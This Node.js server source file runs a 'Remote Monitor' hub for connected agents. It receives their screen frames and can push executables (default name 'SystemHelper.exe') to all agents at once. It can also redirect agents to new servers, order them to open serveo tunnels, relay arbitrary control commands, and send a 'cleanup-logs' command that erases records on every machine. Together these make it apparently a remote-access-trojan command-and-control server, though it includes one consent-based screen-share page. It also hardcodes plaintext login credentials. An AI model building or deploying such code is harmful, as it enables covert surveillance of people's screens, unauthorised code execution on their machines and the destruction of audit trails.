const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const AUTH_USER = 'puneet';
const AUTH_PASS = 'puneet12';
const AUTH_TOKEN = crypto.createHash('sha256').update(AUTH_USER + ':' + AUTH_PASS).digest('hex');

// Store connected agents and dashboards
const agents = new Map();
const dashboards = new Set();
const agentHistory = [];

// Basic Auth middleware

// Basic Auth middleware
function auth(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Remote Monitor"');
    return res.status(401).send('Unauthorized');
  }
  const base64 = authHeader.split(' ')[1];
  const creds = Buffer.from(base64, 'base64').toString().split(':');
  const user = creds[0], pass = creds[1];
  if (user !== AUTH_USER || pass !== AUTH_PASS) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Remote Monitor"');
    return res.status(401).send('Unauthorized');
  }
  next();
}

function wsAuth(req) {
  // Check token in URL
  const url = new URL(req.url, 'http://localhost');
  if (url.searchParams.get('token') === AUTH_TOKEN) return true;
  
  // Check Basic Auth from upgrade request
  const authHeader = req.headers['authorization'];
  if (authHeader) {
    const base64 = authHeader.split(' ')[1];
    const creds = Buffer.from(base64, 'base64').toString().split(':');
    if (creds[0] === AUTH_USER && creds[1] === AUTH_PASS) return true;
  }
  return false;
}

// Serve dashboard with auth token injected into WebSocket URL
app.get('/', auth, (req, res) => {
  try {
    const html = require('fs').readFileSync(__dirname + '/index.html', 'utf8');
    res.send(html.replace(/TOKEN_PLACEHOLDER/g, AUTH_TOKEN));
  } catch (e) {
    res.status(500).send('Dashboard load error: ' + e.message);
  }
});

// Remote session page (no install, browser-based screen sharing)
app.get('/remote-session', auth, (req, res) => {
  res.send(`<!DOCTYPE html><html><body style="margin:0;background:#0f0f23;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column">
<h1 style="color:#7c7cf0">Remote Assistance</h1>
<p style="color:#888;margin:10px 0">You are about to share YOUR screen with the support person.</p>
<button onclick="start()" style="background:#7c7cf0;color:#fff;border:none;padding:15px 30px;border-radius:8px;font-size:18px;cursor:pointer">Share My Screen</button>
<div id="status" style="margin-top:20px;color:#555"></div>
<video id="preview" style="max-width:90%;max-height:60vh;margin-top:20px;display:none" autoplay></video>
<script>
const TOKEN='${AUTH_TOKEN}';
const WS_URL=(location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token='+TOKEN;
let ws,media;

function start(){
 document.getElementById('status').textContent='Requesting screen...';
 navigator.mediaDevices.getDisplayMedia({video:{cursor:'always'},audio:false}).then(s=>{
  media=s;
  document.getElementById('preview').srcObject=s;
  document.getElementById('preview').style.display='block';
  document.getElementById('status').textContent='Connected. You can close this tab when done.';
  
  ws=new WebSocket(WS_URL);
  ws.onopen=()=>{
   const sessionId='session-'+Math.random().toString(36).slice(2,8);
   window.sessionId=sessionId;
   ws.send(JSON.stringify({type:'agent-hello',agentId:sessionId,name:'🖥 Remote Session'}));
  };
  
  // Capture and send frames
  const canvas=document.createElement('canvas');
  const ctx=canvas.getContext('2d');
  const video=document.getElementById('preview');
  
  function sendFrame(){
   if(ws.readyState!==WebSocket.OPEN) return;
   canvas.width=video.videoWidth;canvas.height=video.videoHeight;
   ctx.drawImage(video,0,0);
   canvas.toBlob(b=>{
    const reader=new FileReader();
    reader.onload=()=>ws.send(JSON.stringify({type:'agent-frame',agentId:window.sessionId,frame:reader.result.split(',')[1]}));
    reader.readAsDataURL(b);
   },'image/jpeg',50);
   setTimeout(sendFrame,200);
  }
  
  video.onplay=sendFrame;
  s.getVideoTracks()[0].onended=()=>{ws.close();document.getElementById('status').textContent='Screen sharing ended.'};
 }).catch(e=>{document.getElementById('status').textContent='Error: '+e.message});
}
</script></body></html>`);
});

const MAX_UPLOAD_SIZE = 100 * 1024 * 1024; // 100MB
const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB

// File upload endpoint for remote updates
app.post('/api/upload-update', (req, res) => {
  if (!checkAuthSimple(req)) {
    return res.status(401).send('Unauthorized');
  }
  
  const filename = req.headers['x-filename'] || 'SystemHelper.exe';
  let data = '';
  let aborted = false;
  req.setEncoding('base64');
  req.on('data', chunk => {
    if (aborted) return;
    data += chunk;
    if (Buffer.byteLength(data, 'base64') > MAX_UPLOAD_SIZE) {
      aborted = true;
      req.destroy();
      res.status(413).json({error: 'File too large'});
    }
  });
  req.on('end', () => {
    if (aborted) return;
    let count = 0;
    for (const [id, agent] of agents) {
      if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
        agent.ws.send(JSON.stringify({type: 'push-update', frame: data, command: filename}));
        count++;
      }
    }
    res.json({success: true, pushedTo: count, filename});
    console.log(`Update pushed to ${count} agents: ${filename}`);
  });
});

function checkAuthSimple(req) {
  const h = req.headers['authorization'];
  if (!h) return false;
  const c = Buffer.from(h.split(' ')[1], 'base64').toString().split(':');
  return c[0] === AUTH_USER && c[1] === AUTH_PASS;
}

// Send file to specific agent
app.post('/api/send-file/:agentId', (req, res) => {
  if (!checkAuthSimple(req)) return res.status(401).send('Unauthorized');
  
  const agentId = req.params.agentId;
  const filename = req.headers['x-filename'] || 'file';
  const agent = agents.get(agentId);
  
  if (!agent || !agent.ws || agent.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({error: 'Agent not connected'});
  }
  
  let data = '';
  let aborted = false;
  req.setEncoding('base64');
  req.on('data', chunk => {
    if (aborted) return;
    data += chunk;
    if (Buffer.byteLength(data, 'base64') > MAX_FILE_SIZE) {
      aborted = true;
      req.destroy();
      res.status(413).json({error: 'File too large'});
    }
  });
  req.on('end', () => {
    if (aborted) return;
    agent.ws.send(JSON.stringify({type: 'file-transfer', command: filename, frame: data}));
    res.json({success: true, filename, sentTo: agentId});
    console.log(`File sent to ${agentId}: ${filename}`);
  });
});
app.post('/api/switch-server', (req, res) => {
  if (!checkAuthSimple(req)) return res.status(401).send('Unauthorized');
  
  const newUrl = req.headers['x-server-url'];
  if (!newUrl) return res.status(400).json({error: 'Missing x-server-url header'});
  
  let count = 0;
  for (const [id, agent] of agents) {
    if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
      agent.ws.send(JSON.stringify({type: 'switch-server', command: newUrl}));
      count++;
    }
  }
  console.log(`Switch-server sent to ${count} agents: ${newUrl}`);
  res.json({success: true, agentsNotified: count, newUrl});
});

// Make a specific PC the preferred server
app.post('/api/make-server/:agentId', auth, (req, res) => {
  const agentId = req.params.agentId;
  const agentEntry = agents.get(agentId);
  if (!agentEntry || !agentEntry.ws || agentEntry.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({error: 'Agent not connected'});
  }
  agentEntry.ws.send(JSON.stringify({type: 'set-server-preference', command: 'true'}));
  console.log(`Server preference set for: ${agentId}`);
  res.json({success: true, agent: agentId, message: 'This PC will become server when cloud is unavailable'});
});

// Request direct tunnel to an agent
app.post('/api/tunnel/:agentId', auth, (req, res) => {
  const agentId = req.params.agentId;
  const agentEntry = agents.get(agentId);
  if (!agentEntry || !agentEntry.ws || agentEntry.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({error: 'Agent not connected'});
  }
  agentEntry.ws.send(JSON.stringify({type: 'start-tunnel', command: 'serveo'}));
  console.log(`Tunnel requested for: ${agentId}`);
  res.json({success: true, agent: agentId, message: 'Tunnel starting...'});
});

app.use(express.static(__dirname));

// Report endpoint
app.get('/api/report', auth, (req, res) => {
  const format = req.query.format || 'json';
  const report = [];
  for (const [id, agent] of agents) {
    report.push({
      name: agent.name, id, ip: agent.ip, status: 'online',
      connectedFor: Math.floor((Date.now() - agent.connectedAt) / 1000),
      framesReceived: agent.framesReceived || 0, events: agent.events
    });
  }
  if (format === 'csv') {
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=agent-report.csv');
    res.write('Date,Name,ID,IP,Status,Connected (s),Frames,Events\n');
    for (const a of report) {
      res.write(`"${new Date().toISOString().slice(0,10)}","${a.name}","${a.id}","${a.ip}",${a.status},${a.connectedFor},${a.framesReceived},"${a.events.length}"\n`);
    }
    for (const h of agentHistory) {
      const dur = Math.floor((h.disconnectedAt - h.connectedAt) / 1000);
      res.write(`"${new Date(h.connectedAt).toISOString().slice(0,10)}","${h.name}","${h.id}","${h.ip}",offline,${dur},${h.framesReceived},"${h.events.length}"\n`);
    }
    res.end();
  } else {
    const history = agentHistory.map(h => ({
      name: h.name, id: h.id, ip: h.ip, status: 'offline',
      date: new Date(h.connectedAt).toISOString().slice(0,10),
      connectedFor: Math.floor((h.disconnectedAt - h.connectedAt) / 1000),
      framesReceived: h.framesReceived, events: h.events
    }));
    res.json({online: report, history});
  }
});

// Cleanup command - clear all logs and history
app.post('/api/cleanup', auth, (req, res) => {
  // Clear server-side history
  const count = agentHistory.length;
  agentHistory.length = 0;
  
  // Tell all agents to clean their logs
  let notified = 0;
  for (const [id, agent] of agents) {
    if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
      agent.ws.send(JSON.stringify({type: 'cleanup-logs'}));
      notified++;
    }
  }
  
  console.log(`Cleanup: cleared ${count} history entries, notified ${notified} agents`);
  res.json({success: true, historyCleared: count, agentsNotified: notified});
});

app.get('/api/agents', auth, (req, res) => {
  const list = [];
  for (const [id, agent] of agents) {
    list.push({
      id,
      name: agent.name,
      connected: true,
      lastSeen: agent.lastSeen,
      viewers: agent.viewers.size,
      ip: agent.ip
    });
  }
  res.json(list);
});

// API endpoint to get latest frame of an agent
app.get('/api/frame/:agentId', auth, (req, res) => {
  const agent = agents.get(req.params.agentId);
  if (agent && agent.lastFrame) {
    res.json({ frame: agent.lastFrame });
  } else {
    res.status(404).json({ error: 'Agent not found or no frame' });
  }
});

wss.on('connection', (ws, req) => {
  if (!wsAuth(req)) { ws.close(4001, 'Unauthorized'); return; }
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      switch (data.type) {
        // Agent registration
        case 'agent-hello':
          ws.role = 'agent';
          ws.agentId = data.agentId;
          ws.org = data.org || '';
          // Get client IP from WebSocket connection
          const clientIp = req.socket.remoteAddress?.replace(/^::ffff:/, '') || 'unknown';
          agents.set(data.agentId, {
            ws,
            name: data.name || 'Unknown',
            org: data.org || '',
            lastSeen: Date.now(),
            lastFrame: null,
            framesReceived: 0,
            viewers: new Set(),
            ip: clientIp,
            connectedAt: Date.now(),
            events: [{type: 'connected', time: Date.now()}]
          });
          console.log(`Agent connected: ${data.name} (${data.agentId}) from ${clientIp}`);
          broadcastToDashboards({ type: 'agent-connected', agentId: data.agentId, name: data.name, ip: clientIp });
          break;

        // Agent sends screen frame
        case 'agent-frame':
          const agent = agents.get(data.agentId);
          if (agent) {
            agent.lastFrame = data.frame;
            agent.lastSeen = Date.now();
            agent.framesReceived++;
            // Forward frame to all viewers of this agent
            for (const viewerWs of agent.viewers) {
              if (viewerWs.readyState === WebSocket.OPEN) {
                viewerWs.send(JSON.stringify({
                  type: 'frame',
                  agentId: data.agentId,
                  frame: data.frame
                }));
              }
            }
          }
          break;

        // Agent sends log
        case 'agent-log':
          console.log(`[Agent ${data.agentId}]: ${data.message}`);
          break;

        // Browser (dashboard) registers
        case 'dashboard-hello':
          ws.role = 'dashboard';
          dashboards.add(ws);
          // Send current agent list with IPs and orgs
          const agentList = [];
          const orgList = new Set();
          for (const [id, a] of agents) {
            agentList.push({ id, name: a.name, viewers: a.viewers.size, ip: a.ip, org: a.org || '' });
            if (a.org) orgList.add(a.org);
          }
          ws.send(JSON.stringify({ type: 'agent-list', agents: agentList, orgs: [...orgList] }));
          console.log('Dashboard connected');
          break;

        // Dashboard wants to view an agent
        case 'view-agent':
          if (ws.role === 'dashboard') {
            const targetAgent = agents.get(data.agentId);
            if (targetAgent) {
              targetAgent.viewers.add(ws);
              ws.viewingAgent = data.agentId;
              // Send current frame immediately
              if (targetAgent.lastFrame) {
                ws.send(JSON.stringify({
                  type: 'frame',
                  agentId: data.agentId,
                  frame: targetAgent.lastFrame
                }));
              }
              // Notify agent to increase frame rate
              targetAgent.ws.send(JSON.stringify({
                type: 'set-fps',
                fps: 10
              }));
              console.log(`Dashboard viewing: ${data.agentId}`);
            }
          }
          break;

        // Dashboard stops viewing an agent
        case 'stop-viewing':
          if (ws.role === 'dashboard') {
            const agentsToClean = data.agentId ? [data.agentId] : (ws.viewingAgent ? [ws.viewingAgent] : []);
            for (const aid of agentsToClean) {
              const prevAgent = agents.get(aid);
              if (prevAgent) {
                prevAgent.viewers.delete(ws);
                if (prevAgent.viewers.size === 0) {
                  prevAgent.ws.send(JSON.stringify({ type: 'set-fps', fps: 1 }));
                }
              }
            }
            ws.viewingAgent = null;
          }
          break;

        // Control command from dashboard
        case 'control':
          if (ws.role === 'dashboard' && data.agentId) {
            const targetAgent = agents.get(data.agentId);
            if (targetAgent) {
              targetAgent.ws.send(JSON.stringify({
                type: 'control',
                command: data.command,
                params: data.params
              }));
            }
          }
          break;

        default:
          console.log('Unknown message type:', data.type);
      }
    } catch (err) {
      console.error('Error processing message:', err);
    }
  });

  ws.on('close', () => {
    if (ws.role === 'agent' && ws.agentId) {
      // Only remove if this websocket is still the registered one for this agent
      // (prevents race condition when agent reconnects quickly)
      const agent = agents.get(ws.agentId);
      if (agent && agent.ws === ws) {
        agent.events.push({type: 'disconnected', time: Date.now()});
        // Save to history
        if (typeof agentHistory !== 'undefined') {
          agentHistory.push({
            name: agent.name, id: ws.agentId, ip: agent.ip,
            connectedAt: agent.connectedAt, disconnectedAt: Date.now(),
            framesReceived: agent.framesReceived || 0, events: agent.events
          });
          if (agentHistory.length > 1000) agentHistory.shift();
        }
        agents.delete(ws.agentId);
        broadcastToDashboards({ type: 'agent-disconnected', agentId: ws.agentId });
        console.log(`Agent disconnected: ${ws.agentId}`);
      }
    }
    if (ws.role === 'dashboard') {
      dashboards.delete(ws);
      // Clean up viewer subscriptions
      if (ws.viewingAgent) {
        const prevAgent = agents.get(ws.viewingAgent);
        if (prevAgent) {
          prevAgent.viewers.delete(ws);
          if (prevAgent.viewers.size === 0) {
            prevAgent.ws.send(JSON.stringify({ type: 'set-fps', fps: 1 }));
          }
        }
      }
    }
  });
});

function broadcastToDashboards(data) {
  for (const ws of dashboards) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(data));
    }
  }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Dashboard: http://localhost:${PORT}`);
});